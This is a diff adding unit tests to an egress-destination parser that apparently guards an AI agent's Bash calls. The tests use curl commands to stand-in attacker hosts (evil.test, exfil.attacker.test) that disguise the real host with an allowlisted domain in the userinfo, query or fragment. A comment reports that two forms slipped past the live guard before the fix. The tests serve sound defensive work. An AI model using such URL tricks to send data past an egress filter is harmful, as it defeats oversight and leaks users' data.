@@ -80,6 +80,45 @@ describe("pulling an egress destination out of a shell command", () => {
     ).toEqual({ destination: "https://exfil.attacker.test/mail@docs.anthropic.com" });
   });
 
+  // An authority ends at the first "/", "?" OR "#". These two forms carry no
+  // userinfo at all -- the "@" is inside a query and inside a fragment -- and a
+  // strip bounded at "/" alone answered the host after the "@", which is the
+  // allowlisted one. Measured through a live Guardian while that bound was in
+  // place: both were ALLOWED, while curl resolves `evil.test` for both. These
+  // are the cases the rest of this describe block did not reach.
+  it("leaves an @ inside a query alone, because a query ends the authority", () => {
+    expect(
+      annotateEgressDestination(
+        "egress",
+        {},
+        preliminary({ name: "Bash", args: {}, raw_command: "curl https://evil.test?x=a@docs.anthropic.com" }),
+      ),
+    ).toEqual({ destination: "https://evil.test?x=a@docs.anthropic.com" });
+  });
+
+  it("leaves an @ inside a fragment alone, because a fragment ends the authority too", () => {
+    expect(
+      annotateEgressDestination(
+        "egress",
+        {},
+        preliminary({ name: "Bash", args: {}, raw_command: "curl https://evil.test#a@docs.anthropic.com" }),
+      ),
+    ).toEqual({ destination: "https://evil.test#a@docs.anthropic.com" });
+  });
+
+  // The userinfo still goes when it is genuinely ahead of the query: the bound
+  // is where the authority ends, not a blanket refusal to strip whenever a "?"
+  // appears anywhere in the URL.
+  it("still strips a userinfo that sits ahead of the query", () => {
+    expect(
+      annotateEgressDestination(
+        "egress",
+        {},
+        preliminary({ name: "Bash", args: {}, raw_command: "curl https://docs.anthropic.com:pw@exfil.attacker.test?x=1" }),
+      ),
+    ).toEqual({ destination: "https://exfil.attacker.test?x=1" });
+  });
+
   it("takes the last @ of the authority as the delimiter, since a userinfo may carry one", () => {
     expect(
       annotateEgressDestination(
